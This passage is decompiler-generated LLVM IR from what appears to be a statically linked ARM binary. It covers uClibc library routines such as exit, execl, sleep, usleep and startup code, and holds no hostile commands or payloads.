  uselistorder i32 %v1_15bdc, { 1, 0 }
  uselistorder i32 %v1_15bc4, { 1, 0 }
  uselistorder i32 %v1_15ba0, { 1, 0 }
  uselistorder i32 %v0_15b94, { 1, 0 }
  uselistorder i32 %v0_15b68, { 1, 0, 2 }
  uselistorder i32 %v3_15b48, { 1, 0 }
  uselistorder i32 %v1_15b3c, { 1, 0, 2 }
  uselistorder i32 %v0_15b30, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v1_15ad0, { 1, 0, 2 }
  uselistorder i32 %v0_15ac8, { 1, 0, 2 }
  uselistorder i32 %v0_15ac0, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r7.global-to-local, { 4, 2, 1, 3, 0, 5 }
  uselistorder i32* %r5.global-to-local, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32* %r4.global-to-local, { 6, 7, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_15c3c._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_15c3c, { 2, 0, 1 }
  uselistorder label %bb67, { 1, 0 }
  uselistorder label %dec_label_pc_15c0c, { 1, 0 }
  uselistorder label %dec_label_pc_15bf4, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %bb63, { 1, 0 }
  uselistorder label %bb60, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15b98, { 1, 0 }
  uselistorder label %dec_label_pc_15b94, { 1, 0 }
  uselistorder label %bb58, { 2, 1, 0 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15b10, { 1, 0 }
  uselistorder label %dec_label_pc_15b0c, { 1, 0 }
}

define i32 @__GI_exit(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v2_15c50 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg1, i32* @r4, align 4
  store i32 %v2_15c50, i32* @r0, align 4
  %v1_15c6c = call i32 @__pthread_return_void()
  %v1_15c7c = call i32 @__pthread_return_0()
  %v2_15c84 = load i32, i32* @global_var_3383c.1221, align 4
  %v2_15c88 = icmp eq i32 %v2_15c84, 0
  br i1 %v2_15c88, label %.thread1, label %bb

bb:                                               ; preds = %entry
  call void @__pseudo_branch(i32 %v2_15c84)
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb
  store i32 %v2_15c50, i32* @r0, align 4
  %v1_15ca8 = call i32 @__pthread_return_void()
  store i32 %v1_15ca8, i32* @r0, align 4
  %v1_15cac = call i32 @__GI___uClibc_fini(i32 %v1_15ca8)
  store i32 89280, i32* @lr, align 4
  %v2_15cbc = call i32 @_stdio_term()
  %v0_15cc0 = load i32, i32* @r4, align 4
  %v1_15cc4 = call i32 @__GI__exit(i32 %v0_15cc0)
  unreachable

; uselistorder directives
  uselistorder i32 (i32)* @__GI__exit, { 0, 3, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 2, 1 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @execl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_15ce4 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_15ce4, i32* %ip.global-to-local, align 4
  store i32 %arg2, i32* %stack_var_-8, align 4
  %v2_15cf4 = ptrtoint i32* %stack_var_-32 to i32
  %v2_15cf8 = ptrtoint i32* %stack_var_-8 to i32
  store i32 %v2_15cf8, i32* %stack_var_-32, align 4
  br label %dec_label_pc_15d04

dec_label_pc_15d04:                               ; preds = %dec_label_pc_15d04, %entry
  %v0_15d18 = phi i32 [ %v1_15d18, %dec_label_pc_15d04 ], [ 0, %entry ]
  %v3_15d04 = phi i32 [ %v1_15d0c, %dec_label_pc_15d04 ], [ %v2_15cf8, %entry ]
  %v1_15d08 = inttoptr i32 %v3_15d04 to i32*
  %v2_15d08 = load i32, i32* %v1_15d08, align 4
  %v1_15d0c = add i32 %v3_15d04, 4
  %v2_15d10 = icmp eq i32 %v2_15d08, 0
  store i32 %v1_15d0c, i32* %stack_var_-32, align 4
  %v1_15d18 = add i32 %v0_15d18, 1
  store i32 %v1_15d18, i32* @lr, align 4
  br i1 %v2_15d10, label %dec_label_pc_15d20, label %dec_label_pc_15d04

dec_label_pc_15d20:                               ; preds = %dec_label_pc_15d04
  %v3_15d20.neg = mul i32 %v1_15d18, -4
  %v1_15d24.neg = add i32 %v2_15cf4, -8
  %v2_15d28 = add i32 %v1_15d24.neg, %v3_15d20.neg
  %v2_15d30 = inttoptr i32 %v2_15d28 to i32*
  store i32 %arg1, i32* %v2_15d30, align 4
  store i32 %v2_15cf8, i32* %stack_var_-32, align 4
  %v0_15d3c = load i32, i32* @sp, align 4
  store i32 %v0_15d3c, i32* @r1, align 4
  store i32 %v0_15d3c, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_15d44

dec_label_pc_15d44:                               ; preds = %dec_label_pc_15d44.dec_label_pc_15d44_crit_edge, %dec_label_pc_15d20
  %v1_15d58 = phi i32 [ %v5_15d58, %dec_label_pc_15d44.dec_label_pc_15d44_crit_edge ], [ %v0_15d3c, %dec_label_pc_15d20 ]
  %v3_15d44 = phi i32 [ %v3_15d44.pre, %dec_label_pc_15d44.dec_label_pc_15d44_crit_edge ], [ %v2_15cf8, %dec_label_pc_15d20 ]
  %v1_15d48 = inttoptr i32 %v3_15d44 to i32*
  %v2_15d48 = load i32, i32* %v1_15d48, align 4
  %v0_15d4c = load i32, i32* @lr, align 4
  %v1_15d4c = add i32 %v0_15d4c, -1
  store i32 %v1_15d4c, i32* @lr, align 4
  %v7_15d4c = icmp eq i32 %v0_15d4c, 1
  %v1_15d50 = add i32 %v3_15d44, 4
  store i32 %v1_15d50, i32* %stack_var_-32, align 4
  %v2_15d58 = add i32 %v1_15d58, 4
  %v3_15d58 = inttoptr i32 %v2_15d58 to i32*
  store i32 %v2_15d48, i32* %v3_15d58, align 4
  %v4_15d58 = load i32, i32* %ip.global-to-local, align 4
  %v5_15d58 = add i32 %v4_15d58, 4
  store i32 %v5_15d58, i32* %ip.global-to-local, align 4
  br i1 %v7_15d4c, label %dec_label_pc_15d60, label %dec_label_pc_15d44.dec_label_pc_15d44_crit_edge

dec_label_pc_15d44.dec_label_pc_15d44_crit_edge:  ; preds = %dec_label_pc_15d44
  %v3_15d44.pre = load i32, i32* %stack_var_-32, align 4
  br label %dec_label_pc_15d44

dec_label_pc_15d60:                               ; preds = %dec_label_pc_15d44
  %v2_15d64 = load i32, i32* @global_var_33844.1226, align 4
  store i32 %v2_15d64, i32* @r2, align 4
  %v0_15d68 = call i32 @__GI_execve()
  ret i32 %v0_15d68

; uselistorder directives
  uselistorder i32 %v5_15d58, { 1, 0 }
  uselistorder i32 %v0_15d4c, { 1, 0 }
  uselistorder i32 %v1_15d18, { 0, 2, 1 }
  uselistorder i32 %v1_15d0c, { 1, 0 }
  uselistorder i32 %v3_15d04, { 1, 0 }
  uselistorder i32 %v2_15cf8, { 0, 2, 1, 3 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @sleep(i32 %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-424 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_15d78 = load i32, i32* @r4, align 4
  store i32 %v3_15d78, i32* %stack_var_-20, align 4
  %v6_15d78 = load i32, i32* @r5, align 4
  %v9_15d78 = load i32, i32* @r6, align 4
  %v16_15d78 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %arg1, i32* %ip.global-to-local, align 4
  %v2_15d7c = icmp eq i32 %arg1, 0
  %v2_15d80 = ptrtoint i32* %stack_var_-424 to i32
  br i1 %v2_15d7c, label %dec_label_pc_15f04, label %dec_label_pc_15d98.preheader

dec_label_pc_15d98.preheader:                     ; preds = %entry
  store i32 31, i32* %r1.global-to-local, align 4
  %v5_15da017 = add i32 %v16_15d78, 124
  br label %dec_label_pc_15d90

dec_label_pc_15d90:                               ; preds = %dec_label_pc_15d98.preheader, %dec_label_pc_15d90
  %v5_15da018 = phi i32 [ %v5_15da017, %dec_label_pc_15d98.preheader ], [ %v5_15da0, %dec_label_pc_15d90 ]
  %v2_15d94 = add i32 %v5_15da018, -136
  %v3_15d94 = inttoptr i32 %v2_15d94 to i32*
  store i32 0, i32* %v3_15d94, align 4
  %v0_15d98.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_15d98 = add i32 %v0_15d98.pre, -1
  store i32 %v1_15d98, i32* %r1.global-to-local, align 4
  %v6_15d98 = icmp slt i32 %v1_15d98, 0
  %v4_15da0 = mul i32 %v1_15d98, 4
  %v5_15da0 = add i32 %v4_15da0, %v16_15d78
  br i1 %v6_15d98, label %dec_label_pc_15da8, label %dec_label_pc_15d90

dec_label_pc_15da8:                               ; preds = %dec_label_pc_15d90
  %v2_15da8 = ptrtoint i32* %stack_var_-156 to i32
  store i32 0, i32* @r5, align 4
  store i32 %v2_15da8, i32* @r0, align 4
  store i32 17, i32* @r1, align 4
  %v0_15db8 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_15db8, i32* %stack_var_-28, align 4
  %v0_15dc0 = call i32 @__sigaddset()
  store i32 %v0_15dc0, i32* %r0.global-to-local, align 4
  %v1_15dc4 = load i32, i32* @r5, align 4
  %v5_15dc8 = icmp slt i32 %v0_15dc0, %v1_15dc4
  br i1 %v5_15dc8, label %dec_label_pc_15f0c, label %dec_label_pc_15dcc

dec_label_pc_15dcc:                               ; preds = %dec_label_pc_15da8
  %v2_15dcc = ptrtoint i32* %stack_var_-284 to i32
  store i32 %v2_15dcc, i32* @r4, align 4
  store i32 %v1_15dc4, i32* %r0.global-to-local, align 4
  store i32 %v2_15da8, i32* %r1.global-to-local, align 4
  %v3_15ddc = bitcast i32* %stack_var_-156 to %_TYPEDEF_sigset_t*
  %v4_15ddc = call i32 @__GI_sigprocmask(i32 %v1_15dc4, %_TYPEDEF_sigset_t* %v3_15ddc, i32 %v2_15dcc)
  store i32 %v4_15ddc, i32* %r0.global-to-local, align 4
  %v1_15de0 = load i32, i32* @r5, align 4
  %v9_15de0 = icmp eq i32 %v4_15ddc, %v1_15de0
  br i1 %v9_15de0, label %dec_label_pc_15de8, label %dec_label_pc_15f0c

dec_label_pc_15de8:                               ; preds = %dec_label_pc_15dcc
  store i32 17, i32* %r1.global-to-local, align 4
  store i32 %v2_15dcc, i32* %r0.global-to-local, align 4
  %v2_15df0 = call i32 @__sigismember(i32 %v2_15dcc, i32 17)
  store i32 %v2_15df0, i32* %r0.global-to-local, align 4
  %v1_15df4 = load i32, i32* @r5, align 4
  %v9_15df4 = icmp eq i32 %v2_15df0, %v1_15df4
  br i1 %v9_15df4, label %dec_label_pc_15e0c.preheader, label %dec_label_pc_15de8.dec_label_pc_15ed4_crit_edge

dec_label_pc_15de8.dec_label_pc_15ed4_crit_edge:  ; preds = %dec_label_pc_15de8
  %.pre = ptrtoint i32* %stack_var_-28 to i32
  br label %dec_label_pc_15ed4

dec_label_pc_15e0c.preheader:                     ; preds = %dec_label_pc_15de8
  store i32 31, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15e04

dec_label_pc_15e04:                               ; preds = %dec_label_pc_15e0c.preheader, %dec_label_pc_15e04
  %v5_15e1416 = phi i32 [ %v5_15da017, %dec_label_pc_15e0c.preheader ], [ %v5_15e14, %dec_label_pc_15e04 ]
  %v2_15e08 = add i32 %v5_15e1416, -136
  %v3_15e08 = inttoptr i32 %v2_15e08 to i32*
  store i32 0, i32* %v3_15e08, align 4
  %v0_15e0c.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_15e0c = add i32 %v0_15e0c.pre, -1
  store i32 %v1_15e0c, i32* %r1.global-to-local, align 4
  %v6_15e0c = icmp slt i32 %v1_15e0c, 0
  %v4_15e14 = mul i32 %v1_15e0c, 4
  %v5_15e14 = add i32 %v4_15e14, %v16_15d78
  br i1 %v6_15e0c, label %dec_label_pc_15e1c, label %dec_label_pc_15e04

dec_label_pc_15e1c:                               ; preds = %dec_label_pc_15e04
  store i32 %v2_15da8, i32* @r0, align 4
  store i32 17, i32* @r1, align 4
  %v0_15e24 = call i32 @__sigaddset()
  store i32 %v0_15e24, i32* %r0.global-to-local, align 4
  %v1_15e28 = icmp slt i32 %v0_15e24, 0
  br i1 %v1_15e28, label %dec_label_pc_15f0c, label %dec_label_pc_15e30

dec_label_pc_15e30:                               ; preds = %dec_label_pc_15e1c
  store i32 17, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v4_15e3c = call i32 @__libc_sigaction(i32 17, i32* null, i32 %v2_15d80)
  store i32 %v4_15e3c, i32* %r0.global-to-local, align 4
  %v1_15e40 = icmp slt i32 %v4_15e3c, 0
  br i1 %v1_15e40, label %dec_label_pc_15e48, label %dec_label_pc_15e70

dec_label_pc_15e48:                               ; preds = %dec_label_pc_15e30
  %v0_15e48 = call i32 @__errno_location()
  store i32 %v2_15dcc, i32* %r1.global-to-local, align 4
  store i32 %v0_15e48, i32* %r5.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v1_15e5c = inttoptr i32 %v0_15e48 to i32*
  %v2_15e5c = load i32, i32* %v1_15e5c, align 4
  store i32 %v2_15e5c, i32* @r4, align 4
  %v3_15e60 = bitcast i32* %stack_var_-284 to %_TYPEDEF_sigset_t*
  %v4_15e60 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_15e60, i32 0)
  store i32 -1, i32* %r0.global-to-local, align 4
  %v0_15e68 = load i32, i32* @r4, align 4
  %v1_15e68 = load i32, i32* %r5.global-to-local, align 4
  %v2_15e68 = inttoptr i32 %v1_15e68 to i32*
  store i32 %v0_15e68, i32* %v2_15e68, align 4
  %v17_15f14.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15f10

dec_label_pc_15e70:                               ; preds = %dec_label_pc_15e30
  %v2_15e70 = load i32, i32* %stack_var_-424, align 4
  %v7_15e74 = icmp eq i32 %v2_15e70, 1
  %v2_15e7c = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_15e7c, i32* @r4, align 4
  br i1 %v7_15e74, label %dec_label_pc_15e84, label %dec_label_pc_15eb8

dec_label_pc_15e84:                               ; preds = %dec_label_pc_15e70
  store i32 %v2_15e7c, i32* %r1.global-to-local, align 4
  store i32 %v2_15e7c, i32* %r0.global-to-local, align 4
  %v2_15e8c = bitcast i32* %stack_var_-28 to %timespec*
  %v3_15e8c = call i32 @__libc_nanosleep(%timespec* %v2_15e8c, i32 %v2_15e7c)
  store i32 %v3_15e8c, i32* %r0.global-to-local, align 4
  store i32 %v3_15e8c, i32* %r6.global-to-local, align 4
  %v0_15e94 = call i32 @__errno_location()
  store i32 %v2_15dcc, i32* %r1.global-to-local, align 4
  store i32 %v0_15e94, i32* %r5.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v1_15ea8 = inttoptr i32 %v0_15e94 to i32*
  %v2_15ea8 = load i32, i32* %v1_15ea8, align 4
  store i32 %v2_15ea8, i32* @r4, align 4
  %v3_15eac = bitcast i32* %stack_var_-284 to %_TYPEDEF_sigset_t*
  %v4_15eac = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_15eac, i32 0)
  store i32 %v4_15eac, i32* %r0.global-to-local, align 4
  %v0_15eb0 = load i32, i32* @r4, align 4
  %v1_15eb0 = load i32, i32* %r5.global-to-local, align 4
  %v2_15eb0 = inttoptr i32 %v1_15eb0 to i32*
  store i32 %v0_15eb0, i32* %v2_15eb0, align 4
  %v0_15ee0.pr = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_15ee0

dec_label_pc_15eb8:                               ; preds = %dec_label_pc_15e70
  store i32 %v2_15dcc, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_15ec4 = bitcast i32* %stack_var_-284 to %_TYPEDEF_sigset_t*
  %v4_15ec4 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_15ec4, i32 0)
  store i32 %v4_15ec4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15ed4

dec_label_pc_15ed4:                               ; preds = %dec_label_pc_15de8.dec_label_pc_15ed4_crit_edge, %dec_label_pc_15eb8
  %storemerge.pre-phi = phi i32 [ %.pre, %dec_label_pc_15de8.dec_label_pc_15ed4_crit_edge ], [ %v2_15e7c, %dec_label_pc_15eb8 ]
  store i32 %storemerge.pre-phi, i32* %r0.global-to-local, align 4
  store i32 %storemerge.pre-phi, i32* %r1.global-to-local, align 4
  %v2_15ed8 = bitcast i32* %stack_var_-28 to %timespec*
  %v3_15ed8 = call i32 @__libc_nanosleep(%timespec* %v2_15ed8, i32 %storemerge.pre-phi)
  store i32 %v3_15ed8, i32* %r0.global-to-local, align 4
  store i32 %v3_15ed8, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_15ee0

dec_label_pc_15ee0:                               ; preds = %dec_label_pc_15e84, %dec_label_pc_15ed4
  %v0_15ee0 = phi i32 [ %v0_15ee0.pr, %dec_label_pc_15e84 ], [ %v3_15ed8, %dec_label_pc_15ed4 ]
  %v2_15ee0 = icmp eq i32 %v0_15ee0, 0
  br i1 %v2_15ee0, label %dec_label_pc_15f04, label %dec_label_pc_15ee8

dec_label_pc_15ee8:                               ; preds = %dec_label_pc_15ee0
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_15ef0 = load i32, i32* %stack_var_-28, align 4
  store i32 %v3_15ef0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15f10

dec_label_pc_15f04:                               ; preds = %entry, %dec_label_pc_15ee0
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15f10

dec_label_pc_15f0c:                               ; preds = %dec_label_pc_15dcc, %dec_label_pc_15e1c, %dec_label_pc_15da8
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15f10

dec_label_pc_15f10:                               ; preds = %dec_label_pc_15ee8, %dec_label_pc_15f04, %dec_label_pc_15e48, %dec_label_pc_15f0c
  %v17_15f14 = phi i32 [ %v3_15ef0, %dec_label_pc_15ee8 ], [ 0, %dec_label_pc_15f04 ], [ %v17_15f14.pre, %dec_label_pc_15e48 ], [ -1, %dec_label_pc_15f0c ]
  %v2_15f14 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_15f14, i32* @r4, align 4
  store i32 %v6_15d78, i32* @r5, align 4
  store i32 %v9_15d78, i32* @r6, align 4
  ret i32 %v17_15f14

; uselistorder directives
  uselistorder i32 %storemerge.pre-phi, { 1, 2, 0 }
  uselistorder i32 %v2_15e7c, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v1_15e0c, { 0, 2, 1 }
  uselistorder i32 %v2_15dcc, { 0, 1, 2, 4, 3, 5, 6 }
  uselistorder i32 %v1_15dc4, { 1, 0, 2 }
  uselistorder i32 %v1_15d98, { 0, 2, 1 }
  uselistorder i32 %v16_15d78, { 1, 2, 0 }
  uselistorder i32* %stack_var_-20, { 0, 2, 1 }
  uselistorder i32* %stack_var_-284, { 2, 1, 0, 3 }
  uselistorder i32* %stack_var_-28, { 3, 2, 1, 5, 0, 4 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 11, 12, 8, 9, 10, 13, 14 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 0, 7, 6, 9, 8, 11, 10, 13, 14, 12, 16, 15, 17, 19, 18, 21, 20, 22, 1 }
  uselistorder i32 (i32, i32*, i32)* @__libc_sigaction, { 0, 2, 1 }
  uselistorder i32 (i32, i32)* @__sigismember, { 1, 0 }
  uselistorder i32 ()* @__sigaddset, { 3, 2, 0, 1, 4 }
  uselistorder i32 -136, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_15f10, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_15f0c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15f04, { 1, 0 }
  uselistorder label %dec_label_pc_15ee0, { 1, 0 }
  uselistorder label %dec_label_pc_15ed4, { 1, 0 }
  uselistorder label %dec_label_pc_15e04, { 1, 0 }
  uselistorder label %dec_label_pc_15d90, { 1, 0 }
}

define i32 @usleep(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v3_15f1c = load i32, i32* @r4, align 4
  store i32 1000000, i32* @r4, align 4
  %v2_15f30 = udiv i32 %arg1, 1000000
  store i32 %v2_15f30, i32* %stack_var_-20, align 4
  %v2_15f58 = bitcast i32* %stack_var_-20 to %timespec*
  %v3_15f58 = call i32 @__libc_nanosleep(%timespec* %v2_15f58, i32 0)
  store i32 %v3_15f1c, i32* @r4, align 4
  ret i32 %v3_15f58

; uselistorder directives
  uselistorder i32 (%timespec*, i32)* @__libc_nanosleep, { 2, 0, 1 }
}

define i32 @__GI___uClibc_fini(i32 %arg1) local_unnamed_addr {
dec_label_pc_15f94:
  %stack_var_-8 = alloca i32, align 4
  %v3_15f68 = load i32, i32* @r4, align 4
  store i32 %v3_15f68, i32* %stack_var_-8, align 4
  %v2_15f98 = load i32, i32* @global_var_3384c.1233, align 4
  %v2_15f9c = icmp eq i32 %v2_15f98, 0
  br i1 %v2_15f9c, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_15f94
  call void @__pseudo_branch(i32 %v2_15f98)
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_15f94, %bb
  %v2_15fac = load i32, i32* @global_var_33850.1235, align 4
  %v2_15fb0 = icmp eq i32 %v2_15fac, 0
  br i1 %v2_15fb0, label %bb12, label %bb13

bb12:                                             ; preds = %.thread
  %v3_15fb4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_15fb4, i32* @r4, align 4
  %v9_15fb4 = load i32, i32* @r0, align 4
  ret i32 %v9_15fb4

bb13:                                             ; preds = %.thread
  call void @__pseudo_branch(i32 %v2_15fac)
  %v2_15fc0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_15fc0, i32* @r4, align 4
  %v8_15fc0 = load i32, i32* @r0, align 4
  ret i32 %v8_15fc0

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__pthread_return_0() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_return_void() local_unnamed_addr {
entry:
  %v1_15fdc = load i32, i32* @r0, align 4
  ret i32 %v1_15fdc
}

define i32 @__check_one_fd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_15fe0 = load i32, i32* @r4, align 4
  store i32 %v3_15fe0, i32* %stack_var_-12, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg1, i32* %r5.global-to-local, align 4
  %v2_15ff0 = call i32 @__libc_fcntl(i32 %arg1, i32 1)
  %v7_15ff4 = icmp eq i32 %v2_15ff0, -1
  br i1 %v7_15ff4, label %bb4, label %bb

bb:                                               ; preds = %entry
  %v3_15ff8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_15ff8, i32* @r4, align 4
  ret i32 %v2_15ff0

bb4:                                              ; preds = %entry
  %v0_15ffc = load i32, i32* @r4, align 4
  %v4_16004 = call i32 @__libc_open(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_24b2c.1238, i32 0, i32 0), i32 %v0_15ffc)
  %v1_16008 = load i32, i32* %r5.global-to-local, align 4
  %v9_16008 = icmp eq i32 %v4_16004, %v1_16008
  br i1 %v9_16008, label %bb5, label %bb6

bb5:                                              ; preds = %bb4
  %v3_1600c = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_1600c, i32* @r4, align 4
  ret i32 %v4_16004

bb6:                                              ; preds = %bb4
  %v0_16010 = call i32 @abort()
  %v0_16014 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_16014, label %bb7, label %bb8

bb7:                                              ; preds = %bb6
  %v1_16014 = load i32, i32* @r2, align 4
  %v2_16014 = load i32, i32* @ip, align 4
  %v5_16014 = udiv i32 %v2_16014, 4194304
  %v6_16014 = and i32 %v5_16014, %v1_16014
  store i32 %v6_16014, i32* @r4, align 4
  br label %bb8

bb8:                                              ; preds = %bb6, %bb7
  ret i32 %v0_16010

; uselistorder directives
  uselistorder i32 %v2_15ff0, { 1, 0 }
  uselistorder i32 ()* @abort, { 2, 1, 0, 3 }
  uselistorder i32 (i8*, i32)* @__libc_open, { 5, 2, 0, 1, 3, 4 }
  uselistorder i32 (i32, i32)* @__libc_fcntl, { 0, 5, 9, 8, 7, 6, 4, 3, 2, 1 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %bb8, { 1, 0 }
}

define i32 @__GI___uClibc_init(i32 %arg1) local_unnamed_addr {
entry:
  %v2_1601c = load i32, i32* @global_var_33854.1240, align 4
  %v2_16020 = icmp eq i32 %v2_1601c, 0
  br i1 %v2_16020, label %bb3, label %bb

bb:                                               ; preds = %entry
  %v6_1602c = load i32, i32* @r0, align 4
  ret i32 %v6_1602c

bb3:                                              ; preds = %entry
  store i32 1, i32* @global_var_33854.1240, align 4
  store i32 4096, i32* @global_var_33848.986, align 4
  %v0_16060 = call i32 @_stdio_init()
  ret i32 %v0_16060
}

define i32 @__uClibc_main(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg3 to i32
  %tmp35 = call i32 @__decompiler_undefined_function_0()
  %tmp36 = call i32 @__decompiler_undefined_function_0()
  %tmp37 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-120 = alloca i32, align 4
  store i32 %tmp, i32* @r6, align 4
  %v4_16078 = mul i32 %arg2, 4
  %v5_16078 = add i32 %tmp, %v4_16078
  %v2_1607c = load i32, i32* %arg3, align 4
  %v2_16080 = ptrtoint i32* %stack_var_-120 to i32
  %v1_16084 = add i32 %v5_16078, 4
  %v9_16088 = icmp eq i32 %v1_16084, %v2_1607c
  store i32 %arg2, i32* @r8, align 4
  store i32 %arg7, i32* @global_var_33840.1246, align 4
  store i32 %v1_16084, i32* @global_var_33844.1226, align 4
  store i32 %arg6, i32* @global_var_33850.1235, align 4
  store i32 120, i32* @r2, align 4
  br i1 %v9_16088, label %bb, label %bb41

bb:                                               ; preds = %entry
  store i32 %v5_16078, i32* @global_var_33844.1226, align 4
  br label %bb41

bb41:                                             ; preds = %entry, %bb
  store i32 %arg4, i32* @r7, align 4
  %v2_160c8 = bitcast i32* %stack_var_-120 to i8*
  %v3_160c8 = call i32 @__GI_memset(i8* %v2_160c8, i32 0)
  %storemerge.pre = load i32, i32* @global_var_33844.1226, align 4
  br label %dec_label_pc_160d8

dec_label_pc_160d8:                               ; preds = %dec_label_pc_160d8, %bb41
  %storemerge = phi i32 [ %storemerge.pre, %bb41 ], [ %v4_160d8, %dec_label_pc_160d8 ]
  %v1_160d8 = inttoptr i32 %storemerge to i32*
  %v2_160d8 = load i32, i32* %v1_160d8, align 4
  %v4_160d8 = add i32 %storemerge, 4
  %v2_160dc = icmp eq i32 %v2_160d8, 0
  br i1 %v2_160dc, label %dec_label_pc_160e8, label %dec_label_pc_160d8

dec_label_pc_160e8:                               ; preds = %dec_label_pc_160d8
  store i32 %v4_160d8, i32* @r4, align 4
  %v1_1610822 = inttoptr i32 %v4_160d8 to i32*
  %v2_1610823 = load i32, i32* %v1_1610822, align 4
  %v2_1610c25 = icmp eq i32 %v2_1610823, 0
  br i1 %v2_1610c25, label %dec_label_pc_16114, label %dec_label_pc_160f0

dec_label_pc_160f0:                               ; preds = %dec_label_pc_160e8, %dec_label_pc_16108
  %v5_160f4 = phi i32 [ %v2_16108, %dec_label_pc_16108 ], [ %v2_1610823, %dec_label_pc_160e8 ]
  %v2_160f0 = icmp ugt i32 %v5_160f4, 13
  %v7_160f0 = icmp eq i32 %v5_160f4, 14
  %v2_160f4 = xor i1 %v2_160f0, true
  %v3_160f4 = or i1 %v7_160f0, %v2_160f4
  br i1 %v3_160f4, label %bb42, label %bb43

bb42:                                             ; preds = %dec_label_pc_160f0
  %v6_160f4 = and i32 %v5_160f4, 536870912
  %v7_160f4 = icmp ne i32 %v6_160f4, 0
  br label %bb43

bb43:                                             ; preds = %dec_label_pc_160f0, %bb42
  %v1_16100 = phi i1 [ %v2_160f0, %dec_label_pc_160f0 ], [ %v7_160f4, %bb42 ]
  %v2_160f8 = xor i1 %v1_16100, true
  %v3_160f8 = or i1 %v7_160f0, %v2_160f8
  br i1 %v3_160f8, label %bb44, label %dec_label_pc_16108

bb44:                                             ; preds = %bb43
  br label %dec_label_pc_16108

dec_label_pc_16108:                               ; preds = %bb43, %bb44
  call void @__pseudo_cond_branch(i1 %v3_160f8, i32 ptrtoint (i32* @global_var_13e10.1249 to i32))
  %v0_16104 = load i32, i32* @r4, align 4
  %v1_16104 = add i32 %v0_16104, 8
  store i32 %v1_16104, i32* @r4, align 4
  %v1_16108 = inttoptr i32 %v1_16104 to i32*
  %v2_16108 = load i32, i32* %v1_16108, align 4
  %v2_1610c = icmp eq i32 %v2_16108, 0
